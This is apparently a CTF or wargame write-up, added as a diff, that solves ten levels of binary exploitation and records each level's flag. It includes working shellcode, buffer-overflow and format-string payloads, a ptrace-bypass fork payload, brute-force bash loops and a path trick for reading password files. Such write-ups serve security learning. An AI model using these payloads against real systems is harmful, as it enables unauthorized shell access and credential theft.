@@ -1,0 +1,181 @@
+level00
+
+Executing binary, asking for password
+Using gdb we can see it use scanf and ask for a number then compare it to 0x149c (5276)
+executing binary and put 5276 as password, open shell `cat /home/users/level01/.pass`
+
+flag = uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL
+
+level01
+
+binary ask for a username and verify it
+using gdb we find that the username asked is compared to "dat_will"
+trying "dat_will" as username work, and now ask for a password.
+Looking for password in gdb, cant find a password and anyway in the main function it does seem that a good password lead to anywhere.
+trying very long password it segfault. segfault appear at 70+ char
+trying to put as username "dat_will" + random char it work and ask for the password
+username is stored in var "a_user_name" at 0x804a040
+create a file with "dat_will" + shellcode to start a shell + "\n" + 70 char + address of "a_user_name" + len_of_dat_will(8)
+echo -e "dat_will\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\n01234567890123456789012345678901234567890123456789012345678901234567890123456789\x48\xa0\x04\x08" > /tmp/dw && cat /tmp/dw  | ./level01
+it start a shell we can now `cat /home/users/level02/.pass`
+flag = PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+
+level02
+
+Binary asking for login and password
+If the password does not match the level03 flag it use printf to print the login
+Using printf for the exploit. We start with AAAA and print %p untill we find the address with 41414141
+We find it but as binary as been compilated as 64-bit the address are 8bytes and the address of the string found with gdb of the flag (fopen fread) is only 6 bytes(the first 2 are 0) so we can't inject it at the start of the string for the login. We could inject it at the end of the login string but it's easier to just inject in at the password string
+The password string is the 8th address so we will print the 8th string with %8$s, after this we fill with char for the fread of 100 and place properly for the injection the string address 0x7fffffffe5XX.
+XX will be replaced to find the right address of the string.
+
+
+#!/bin/bash
+
+i=0
+
+while [ $i  -lt 255 ]
+
+do
+
+   x=`printf "\x%02x\n"  $i`
+
+   y=`expr $i + 4`
+
+   z=`printf "\x%02x\n"  $y`
+
+   echo -n -e "*%8\$s*  aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" > /tmp/lv2 && echo -e -n $x >> /tmp/lv2 && echo -e -n "\xe5\xff\xff\xff\x7f" >> /tmp/lv2 && cat /tmp/lv2 - | ~/level02
+
+   echo $x
+
+   i=`expr $i + 1`
+
+done
+
+level03
+
+binary level03 is looking for a password
+Looking through gdb binary is looking for a password with scanf %d and then check it with the function test
+it look if it is lower than 21 and if this is true it use it in decrypt function
+trying to put 1, the value of the password at -0xc(%ebp) is equal to 322424844
+trying to put 322424844, the value is 1, so we will try this value for this to match the test lower than 21 the value for 21 is 322424824
+So value between 322424824 and 322424845
+
+#!/bin/bash
+
+i=322424820
+
+while [ $i  -lt 322424846 ]
+
+do
+
+   x=`printf "%d\n"  $i`
+
+   echo $x > /tmp/lv33
+   echo $x
+
+   cat /tmp/lv33 - | ~/level03
+
+   i=`expr $i + 1`
+
+done
+
+322424827 is the password and it start a shell
+we can know get the flag
+flag = kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
+
+level04
+
+Binary asking for a shellcode
+In gdb we can see that the program use fork and then use ptrace to check child
+in ghira we can see that the program check with ptrace if the child use system exec
+and if so it exit the program.
+If we try to use our shellcode (getting right address of the child with gdb and "set follow-fork-mode child")
+it will say "no exec() for you". So we need to bypass the check. If we use a fork before just before the shellcode we use, the child of the child will not be tracked by the parent and will execute shellcode with system exec()
+echo -n -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xb0\x02\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\xb0\x01\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" > /tmp/lv4 && echo -e -n "\x50" >> /tmp/lv4 && echo -e -n "\xd6\xff\xff" >> /tmp/lv4 && cat /tmp/lv4 - | ~/level04
+
+flag = 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+
+level05
+
+Binary fgets 100 char, it then lower the uppercase and print it with printf
+so we can use this string for the shellcode as there is some uppercase char
+so we inject the shell code as argument and inject in stdin the exploit for printf
+We want to replace the address call exit in shared lib by our shellcode but the address is too big to replace with %n so we will use %hn to replace 2 bytes instead of 4
+the shellcode is a lot of \x90 and then the shellcode, so its simplier to get the right address
+
+echo -e "\xe2\x97\x04\x08\xe0\x97\x04\x08%055288d%11\$hn%010239d%10\$hn" > in
+
+shellcode = \x90 * a lot + \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+
+flag = h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
+level06
+
+Binary asking for a login and the a Serial, using ghidra we can see that if auth return 0 the binary start a shell
+auth return 0 if after a calcul with the string it is equal to the serila, so we just try a string for exemple level07 and we break at the cmp to see what it is compared to. In gdb the program is stoped because of a ptrace so we break before the check and jump the verification.
+We can now check what is in the register ebp - 16, it is 6233722
+We can now connect with the binary with login level07 and serial 6233722
+
+flag = GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8
+
+level07
+
+level07 binary store unsigned int into index.
+index % 3 == 0 are reserved.
+Found with gdb that index 114 is the address of return of main function, but we can not use 114 index as it is reserved.
+As the index is the index of a table of int, we can use that to overflow, to cicle and bypass this reservation
+As a int is 4 bytes, we take (INTMAX = 2147483647 + 1) / 2 = 1073741824. If we try to store at this index a number we can read it at the index 0. We can now store at the index 114 to redirect the main return, but we can not inject a shellcode from argument or env as the program set the memory at 0 at those places.
+So we need to replace all the shellcode into the memory using command of the program, storing each byte with store and replacing 114 index (main function) then using quit command to make the main function return and execute the shellcode.
+Getting approximativ address of the table with gdb and storing 0x90 at the start to make it easier to execute the shellcode.
+file level07cmd
+cat /tmp/level07in - | ~/level07
+flag = 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+
+level08
+
+Program seem to read a file passed as argument and then it create a backup in backups directory
+So we try to use it on /home/users/level09/.pass
+But it doesnot work. ERROR: Failed to open ./backups//home/users/level09/.pass
+We can not create directory in this directory as we do not get the persmissions
+We can see that it looks for the directory "./backups".
+If we try to execute the binary from the directory /tmp it will get the backups directory from this directory in /tmp so all we need is to create each directory backups/home/users/level09
+and then if we execute the program when we are located in /tmp it will crate the file with flag in it.
+cd /tmp
+mkdir -p backups/home/users/level09
+~/level08 /home/users/level09/.pass
+cat /tmp/backups/home/users/level09/.pass
+
+flag = fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+
+level09
+
+Program ask for a username and then a message to send
+Using objdump -D on binary, we can see that there is a function called secret_backdoor that start a shell.
+We need to make a buffer overflow but the function in set_msg is secured with a strncpy. Using ghidra we can see that thefunction strncpy use as length the byte at the address of the string reserved + 180, while the username of 41 char is stored at string reserved + 140.
+So we need to inject as username a string composed of byte to replace the length of 140 supposed for strncpy.
+We this we will be able to replace the return address of the main function by something else.
+The username will be composed of byte equal to 206 so the strncpy will place only 206 bytes, the length is important to replace a correct address. So the message injected will be 200 randoms chars and then the address of the function secret_backdoor (as the address may vary a little we will try and change the last byte of the address to try to match right)
+After the address we complete with a newline, so the second fgets will stop there and the function secret_backdoor will get "sh" and start a shell with the function "system()"
+
+
+#!/bin/bash
+
+i=112
+
+while [ $i  -lt 191 ]
+
+do
+
+   x=`printf "\x%02x\n"  $i`
+
+   echo -n -e "backdoor\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\xce\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23" > /tmp/lv9 && echo -e -n $x >> /tmp/lv9 && echo -e -n "\x48\x55\x55\x55\x55\x0ash" >> /tmp/lv9 && cat /tmp/lv9 - | ~/level09
+   echo $x
+
+   i=`expr $i + 1`
+
+done
+
+We can now cat /home/users/end/.pass
+
+flag = j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
